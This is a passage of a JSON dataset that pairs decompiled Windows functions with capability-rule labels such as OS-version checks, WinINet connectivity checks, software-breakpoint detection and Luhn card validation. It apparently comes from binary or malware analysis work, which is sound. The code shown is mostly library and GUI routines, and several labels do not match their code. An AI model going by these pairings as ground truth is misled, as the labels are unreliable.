            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.14002642c(uint16_t *arg1, uint8_t *arg2, uint64_t arg3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg2 != NULL) && (arg3 != 0)) {\n        if (*arg2 != 0) {\n            fcn.14001be3c(aiStack40, 0);\n            if (*(aiStack40[0] + 0x14) != 0) {\n                iVar2 = fcn.1400252a0(*arg2, aiStack40);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                      (*(aiStack40[0] + 4), 9, arg2, 1, arg1, arg1 != NULL);\n                    if (iVar2 != 0) goto code_r0x000140026328;\n                }\n                else {\n                    iVar2 = *(aiStack40[0] + 0x10c);\n                    if ((((1 < iVar2) && (iVar2 <= arg3)) &&\n                        (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                           (*(aiStack40[0] + 4), 9, arg2, iVar2, arg1, arg1 != NULL),  iVar2 != 0)) ||\n                       ((*(aiStack40[0] + 0x10c) <= arg3 && (arg2[1] != 0)))) {\n                        uVar1 = *(aiStack40[0] + 0x10c);\n                        if (cStack16 == '\\0') {\n                            return uVar1;\n                        }\n                        *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n                        return uVar1;\n                    }\n                }\n                puVar3 = fcn.14001bc68();\n                *puVar3 = 0x2a;\n                if (cStack16 != '\\0') {\n                    *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n                }\n                return 0xffffffff;\n            }\n            if (arg1 != NULL) {\n                *arg1 = *arg2;\n            }\ncode_r0x000140026328:\n            if (cStack16 != '\\0') {\n                *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n            }\n            return 1;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 605
    },
    "14002762": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14002762c(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    \n    iVar5 = 0;\n    iVar3 = 0;\n    fcn.140023ba4(1);\n    for (uVar4 = 0; uVar4 < *0x140055700; uVar4 = uVar4 + 1) {\n        iVar6 = uVar4;\n        if ((*(*0x1400546f8 + iVar6 * 8) != 0) && (iVar1 = *(*0x1400546f8 + iVar6 * 8),  (*(iVar1 + 0x18) & 0x83) != 0))\n        {\n            fcn.1400251b8(uVar4, iVar1);\n            iVar1 = *(*0x1400546f8 + iVar6 * 8);\n            if ((*(iVar1 + 0x18) & 0x83) != 0) {\n                if (arg1 == 1) {\n                    iVar2 = fcn.1400275e4(iVar1);\n                    if (iVar2 != -1) {\n                        iVar5 = iVar5 + 1;\n                    }\n                }\n                else if (((arg1 == 0) && ((*(iVar1 + 0x18) & 2) != 0)) && (iVar2 = fcn.1400275e4(iVar1),  iVar2 == -1))\n                {\n                    iVar3 = -1;\n                }\n            }\n            fcn.140025240(uVar4, *(*0x1400546f8 + iVar6 * 8));\n        }\n    }\n    fcn.140023aa4(1);\n    if (arg1 == 1) {\n        iVar3 = iVar5;\n    }\n    return iVar3;\n}\n",
        "token_count": 431
    },
    "14002772": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.14002772c(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int32_t iVar17;\n    uint32_t auStack88 [4];\n    uint32_t uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    \n    uVar1 = arg1[5];\n    uVar15 = 0;\n    uVar10 = 1;\n    uVar11 = uVar1 & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    auStack88[0] = *(arg1 + 3);\n    auStack88[1] = *(arg1 + 1);\n    auStack88[2] = *arg1 << 0x10;\n    iVar4 = 0;\n    uVar5 = uVar15;\n    if (iVar12 == -0x3fff) {\n        do {\n            if (auStack88[uVar5] != 0) {\n                auStack88[0] = 0;\n                auStack88[1] = 0;\n                uVar15 = 2;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 3);\n    }\n    else {\n        uStack72 = *(arg1 + 3);\n        uStack68 = *(arg1 + 1);\n        iStack64 = *arg1 << 0x10;\n        uVar9 = str.5_v_[0] >> 0x1f & 0x1f;\n        uVar3 = str.5_v_[0] + uVar9;\n        iVar17 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar9);\n        uVar7 = uVar3;\n        if ((auStack88[iVar17] >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((auStack88[iVar17] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                for (iVar6 = iVar17 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                    if (auStack88[iVar6] != 0) goto code_r0x000140027839;\n                }\n            }\n            else {\ncode_r0x000140027839:\n                uVar3 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                iVar4 = str.5_v_[0] + L'\\xffffffff' + uVar3;\n                iVar13 = iVar4 >> 5;\n                uVar9 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = auStack88[iVar13] + uVar9;\n                if ((uVar3 < auStack88[iVar13]) || (uVar3 < uVar9)) {\n                    uVar5 = 1;\n                }\n                iVar4 = uVar5;\n                auStack88[iVar13] = uVar3;\n                iVar6 = iVar13 + -1;\n                while ((-1 < iVar6 && (iVar4 = uVar5,  iVar4 != 0))) {\n                    uVar3 = auStack88[iVar6] + 1;\n                    if ((uVar3 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar3 == 0)) {\n                        uVar5 = uVar10;\n                    }\n                    iVar4 = uVar5;\n                    auStack88[iVar6] = uVar3;\n                    iVar6 = iVar6 + -1;\n                }\n            }\n        }\n        auStack88[iVar17] = auStack88[iVar17] & -1 << (uVar7 & 0x1f);\n        iVar6 = iVar17 + 1;\n        if (iVar6 < 3) {\n            fcn.14001bd50(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n        }\n        iVar17 = iVar12;\n        if (iVar4 != 0) {\n            iVar17 = uVar11 - 0x3ffe;\n        }\n        if (iVar17 < *0x14003f7dc - str.5_v_[0]) {\n            auStack88[0] = 0;\n            auStack88[1] = 0;\n            uVar15 = 2;\n            iVar4 = 0;\n        }\n        else if (*0x14003f7dc < iVar17) {\n            uVar11 = str.5_v_[1] >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + uVar11;\n            iVar12 = iVar4 >> 5;\n            uVar7 = iVar4;\n            cVar2 = uVar11;\n            if (iVar17 < *0x14003f7d8) {\n                auStack88[0] = auStack88[0] & 0x7fffffff;\n                iVar4 = str.5_v_[3] + iVar17;\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                uVar5 = uVar15;\n                uVar10 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar5];\n                    auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar10;\n                    uVar5 = uVar5 + 1;\n                    uVar10 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar5 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n            }\n            else {\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                auStack88[0] = 0x80000000;\n                auStack88[1] = 0;\n                auStack88[2] = 0;\n                uVar5 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar15];\n                    auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                    uVar15 = uVar15 + 1;\n                    uVar5 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar15 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n                iVar4 = str.5_v_[3] + *0x14003f7d8;\n                uVar15 = uVar10;\n            }\n        }\n        else {\n            auStack88[0] = uStack72;\n            auStack88[1] = uStack68;\n            auStack88[2] = iStack64;\n            uVar11 = *0x14003f7dc - iVar12 >> 0x1f & 0x1f;\n            iVar4 = (*0x14003f7dc - iVar12) + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            uVar16 = uVar15;\n            do {\n                uVar11 = auStack88[uVar5];\n                auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar16;\n                uVar5 = uVar5 + 1;\n                uVar16 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar5 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            uVar3 = str.5_v_[0] >> 0x1f & 0x1f;\n            uVar11 = str.5_v_[0] + uVar3;\n            iVar4 = uVar11 >> 5;\n            uVar11 = 0x1f - ((uVar11 & 0x1f) - uVar3);\n            uVar7 = uVar11;\n            if ((auStack88[iVar4] >> (uVar11 & 0x1f) & 1) != 0) {\n                if ((auStack88[iVar4] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                    for (iVar6 = iVar4 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                        if (auStack88[iVar6] != 0) goto code_r0x000140027a26;\n                    }\n                }\n                else {\ncode_r0x000140027a26:\n                    uVar11 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                    iVar12 = str.5_v_[0] + L'\\xffffffff' + uVar11;\n                    iVar17 = iVar12 >> 5;\n                    uVar3 = 1 << (0x1f - ((iVar12 & 0x1f) - uVar11) & 0x1f);\n                    uVar11 = auStack88[iVar17] + uVar3;\n                    if ((uVar11 < auStack88[iVar17]) || (uVar5 = uVar15,  uVar11 < uVar3)) {\n                        uVar5 = uVar10;\n                    }\n                    auStack88[iVar17] = uVar11;\n                    iVar6 = iVar17 + -1;\n                    while ((-1 < iVar6 && (uVar5 != 0))) {\n                        uVar11 = auStack88[iVar6] + 1;\n                        if ((uVar11 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar11 == 0)) {\n                            uVar5 = uVar10;\n                        }\n                        auStack88[iVar6] = uVar11;\n                        iVar6 = iVar6 + -1;\n                    }\n                }\n            }\n            auStack88[iVar4] = auStack88[iVar4] & -1 << (uVar7 & 0x1f);\n            iVar6 = iVar4 + 1;\n            if (iVar6 < 3) {\n                fcn.14001bd50(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n            }\n            uVar11 = str.5_v_[1] + L'\\x01' >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + L'\\x01' + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            do {\n                uVar11 = auStack88[uVar15];\n                auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                uVar15 = uVar15 + 1;\n                uVar5 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar15 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            iVar4 = 0;\n            uVar15 = 2;\n        }\n    }\n    auStack88[0] = iVar4 << (0x1fU - str.5_v_[1] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | auStack88[0];\n    if (str.5_v_[2] == L'@') {\n        arg2[1] = auStack88[0];\n        *arg2 = auStack88[1];\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg2 = auStack88[0];\n    }\n    return uVar15;\n}\n",
        "token_count": 3200
    },
    "140027d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.140027d30(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int32_t iVar17;\n    uint32_t auStack88 [4];\n    uint32_t uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    \n    uVar1 = arg1[5];\n    uVar15 = 0;\n    uVar10 = 1;\n    uVar11 = uVar1 & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    auStack88[0] = *(arg1 + 3);\n    auStack88[1] = *(arg1 + 1);\n    auStack88[2] = *arg1 << 0x10;\n    iVar4 = 0;\n    uVar5 = uVar15;\n    if (iVar12 == -0x3fff) {\n        do {\n            if (auStack88[uVar5] != 0) {\n                auStack88[0] = 0;\n                auStack88[1] = 0;\n                uVar15 = 2;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 3);\n    }\n    else {\n        uStack72 = *(arg1 + 3);\n        uStack68 = *(arg1 + 1);\n        iStack64 = *arg1 << 0x10;\n        uVar9 = *0x14003f7f8 >> 0x1f & 0x1f;\n        uVar3 = *0x14003f7f8 + uVar9;\n        iVar17 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar9);\n        uVar7 = uVar3;\n        if ((auStack88[iVar17] >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((auStack88[iVar17] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                for (iVar6 = iVar17 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                    if (auStack88[iVar6] != 0) goto code_r0x000140027e3d;\n                }\n            }\n            else {\ncode_r0x000140027e3d:\n                uVar3 = *0x14003f7f8 + -1 >> 0x1f & 0x1f;\n                iVar4 = *0x14003f7f8 + -1 + uVar3;\n                iVar13 = iVar4 >> 5;\n                uVar9 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = auStack88[iVar13] + uVar9;\n                if ((uVar3 < auStack88[iVar13]) || (uVar3 < uVar9)) {\n                    uVar5 = 1;\n                }\n                iVar4 = uVar5;\n                auStack88[iVar13] = uVar3;\n                iVar6 = iVar13 + -1;\n                while ((-1 < iVar6 && (iVar4 = uVar5,  iVar4 != 0))) {\n                    uVar3 = auStack88[iVar6] + 1;\n                    if ((uVar3 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar3 == 0)) {\n                        uVar5 = uVar10;\n                    }\n                    iVar4 = uVar5;\n                    auStack88[iVar6] = uVar3;\n                    iVar6 = iVar6 + -1;\n                }\n            }\n        }\n        auStack88[iVar17] = auStack88[iVar17] & -1 << (uVar7 & 0x1f);\n        iVar6 = iVar17 + 1;\n        if (iVar6 < 3) {\n            fcn.14001bd50(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n        }\n        iVar17 = iVar12;\n        if (iVar4 != 0) {\n            iVar17 = uVar11 - 0x3ffe;\n        }\n        if (iVar17 < *0x14003f7f4 - *0x14003f7f8) {\n            auStack88[0] = 0;\n            auStack88[1] = 0;\n            uVar15 = 2;\n            iVar4 = 0;\n        }\n        else if (*0x14003f7f4 < iVar17) {\n            uVar11 = *0x14003f7fc >> 0x1f & 0x1f;\n            iVar4 = *0x14003f7fc + uVar11;\n            iVar12 = iVar4 >> 5;\n            uVar7 = iVar4;\n            cVar2 = uVar11;\n            if (iVar17 < *0x14003f7f0) {\n                auStack88[0] = auStack88[0] & 0x7fffffff;\n                iVar4 = *0x14003f804 + iVar17;\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                uVar5 = uVar15;\n                uVar10 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar5];\n                    auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar10;\n                    uVar5 = uVar5 + 1;\n                    uVar10 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar5 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n            }\n            else {\n                uVar7 = (uVar7 & 0x1f) - cVar2;\n                auStack88[0] = 0x80000000;\n                auStack88[1] = 0;\n                auStack88[2] = 0;\n                uVar5 = uVar15;\n                do {\n                    uVar11 = auStack88[uVar15];\n                    auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                    uVar15 = uVar15 + 1;\n                    uVar5 = (~(-1 << (uVar7 & 0x1f)) & uVar11) << (0x20 - uVar7 & 0x1f);\n                } while (uVar15 < 3);\n                iVar6 = 2;\n                puVar8 = auStack88 + (2 - iVar12);\n                do {\n                    if (iVar6 < iVar12) {\n                        auStack88[iVar6] = 0;\n                    }\n                    else {\n                        auStack88[iVar6] = *puVar8;\n                    }\n                    iVar6 = iVar6 + -1;\n                    puVar8 = puVar8 + -1;\n                } while (-1 < iVar6);\n                iVar4 = *0x14003f804 + *0x14003f7f0;\n                uVar15 = uVar10;\n            }\n        }\n        else {\n            auStack88[0] = uStack72;\n            auStack88[1] = uStack68;\n            auStack88[2] = iStack64;\n            uVar11 = *0x14003f7f4 - iVar12 >> 0x1f & 0x1f;\n            iVar4 = (*0x14003f7f4 - iVar12) + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            uVar16 = uVar15;\n            do {\n                uVar11 = auStack88[uVar5];\n                auStack88[uVar5] = uVar11 >> (uVar7 & 0x1f) | uVar16;\n                uVar5 = uVar5 + 1;\n                uVar16 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar5 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            uVar3 = *0x14003f7f8 >> 0x1f & 0x1f;\n            uVar11 = *0x14003f7f8 + uVar3;\n            iVar4 = uVar11 >> 5;\n            uVar11 = 0x1f - ((uVar11 & 0x1f) - uVar3);\n            uVar7 = uVar11;\n            if ((auStack88[iVar4] >> (uVar11 & 0x1f) & 1) != 0) {\n                if ((auStack88[iVar4] & ~(-1 << (uVar7 & 0x1f))) == 0) {\n                    for (iVar6 = iVar4 + 1; iVar6 < 3; iVar6 = iVar6 + 1) {\n                        if (auStack88[iVar6] != 0) goto code_r0x00014002802a;\n                    }\n                }\n                else {\ncode_r0x00014002802a:\n                    uVar11 = *0x14003f7f8 + -1 >> 0x1f & 0x1f;\n                    iVar12 = *0x14003f7f8 + -1 + uVar11;\n                    iVar17 = iVar12 >> 5;\n                    uVar3 = 1 << (0x1f - ((iVar12 & 0x1f) - uVar11) & 0x1f);\n                    uVar11 = auStack88[iVar17] + uVar3;\n                    if ((uVar11 < auStack88[iVar17]) || (uVar5 = uVar15,  uVar11 < uVar3)) {\n                        uVar5 = uVar10;\n                    }\n                    auStack88[iVar17] = uVar11;\n                    iVar6 = iVar17 + -1;\n                    while ((-1 < iVar6 && (uVar5 != 0))) {\n                        uVar11 = auStack88[iVar6] + 1;\n                        if ((uVar11 < auStack88[iVar6]) || (uVar5 = uVar15,  uVar11 == 0)) {\n                            uVar5 = uVar10;\n                        }\n                        auStack88[iVar6] = uVar11;\n                        iVar6 = iVar6 + -1;\n                    }\n                }\n            }\n            auStack88[iVar4] = auStack88[iVar4] & -1 << (uVar7 & 0x1f);\n            iVar6 = iVar4 + 1;\n            if (iVar6 < 3) {\n                fcn.14001bd50(auStack88 + iVar6, 0, (3 - iVar6) * 4);\n            }\n            uVar11 = *0x14003f7fc + 1 >> 0x1f & 0x1f;\n            iVar4 = *0x14003f7fc + 1 + uVar11;\n            uVar7 = (iVar4 & 0x1f) - uVar11;\n            uVar5 = uVar15;\n            do {\n                uVar11 = auStack88[uVar15];\n                auStack88[uVar15] = uVar11 >> (uVar7 & 0x1f) | uVar5;\n                uVar15 = uVar15 + 1;\n                uVar5 = (uVar11 & ~(-1 << (uVar7 & 0x1f))) << (0x20 - uVar7 & 0x1f);\n            } while (uVar15 < 3);\n            iVar14 = iVar4 >> 5;\n            iVar6 = 2;\n            puVar8 = auStack88 + (2 - iVar14);\n            do {\n                if (iVar6 < iVar14) {\n                    auStack88[iVar6] = 0;\n                }\n                else {\n                    auStack88[iVar6] = *puVar8;\n                }\n                iVar6 = iVar6 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar6);\n            iVar4 = 0;\n            uVar15 = 2;\n        }\n    }\n    auStack88[0] = iVar4 << (0x1fU - *0x14003f7fc & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | auStack88[0];\n    if (*0x14003f800 == 0x40) {\n        arg2[1] = auStack88[0];\n        *arg2 = auStack88[1];\n    }\n    else if (*0x14003f800 == 0x20) {\n        *arg2 = auStack88[0];\n    }\n    return uVar15;\n}\n",
        "token_count": 3219
    },
    "14002a5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.14002a5ec(ulong arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    \n    piVar4 = fcn.14001276c();\n    iVar5 = fcn.140006c48();\n    piVar1 = *(iVar5 + 8);\n    iVar2 = fcn.140019398(arg1, arg2, arg3, arg4 & 0xffffffff);\n    uVar3 = 0xffffffff;\n    if ((iVar2 != 0) && ((piVar1 == NULL || (iVar2 = (**(*piVar1 + 0x120))(piVar1),  uVar3 = 0xffffffff,  iVar2 != 0))))\n    {\n        iVar2 = (**(*piVar4 + 0xa0))(piVar4);\n        if (iVar2 == 0) {\n            if (piVar4[8] != 0) {\n                (**(*piVar4[8] + 0xc0))();\n            }\n            uVar3 = (**(*piVar4 + 0xd0))(piVar4);\n        }\n        else {\n            uVar3 = (**(*piVar4 + 0xa8))(piVar4);\n        }\n    }\n    fcn.140016094();\n    return uVar3;\n}\n",
        "token_count": 320
    },
    "1400027a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1400027a0(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    arg1[0x1b] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x1b);\n    arg1[0x19] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x19);\n    arg1[0x17] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x17);\n    arg1[0x15] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x15);\n    *arg1 = vtable.CButton.0;\n    fcn.14000b6d8(arg1);\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 451
    },
    "14000f42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000f420(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    *arg1 = vtable.CButton.0;\n    fcn.14000b6d8(arg1);\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 324
    },
    "14000293": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140002930(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar5;\n    \n    *arg1 = vtable.CHoverButtonEx.0;\n    piVar3 = arg1[0x2c];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3, 1, in_R8, in_R9, 0xfffffffffffffffe);\n    }\n    if (arg1[0x28] != NULL) {\n        fcn.1400058b4(arg1[0x28]);\n    }\n    pcVar4 = arg1[0x2b];\n    LOCK();\n    piVar1 = pcVar4 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar4 + -0x18) + 8))();\n    }\n    arg1[0x25] = vtable.CRgn.0;\n    fcn.140002730(arg1 + 0x25);\n    arg1[0x1f] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x1f);\n    arg1[0x1b] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x1b);\n    arg1[0x19] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x19);\n    arg1[0x17] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x17);\n    arg1[0x15] = 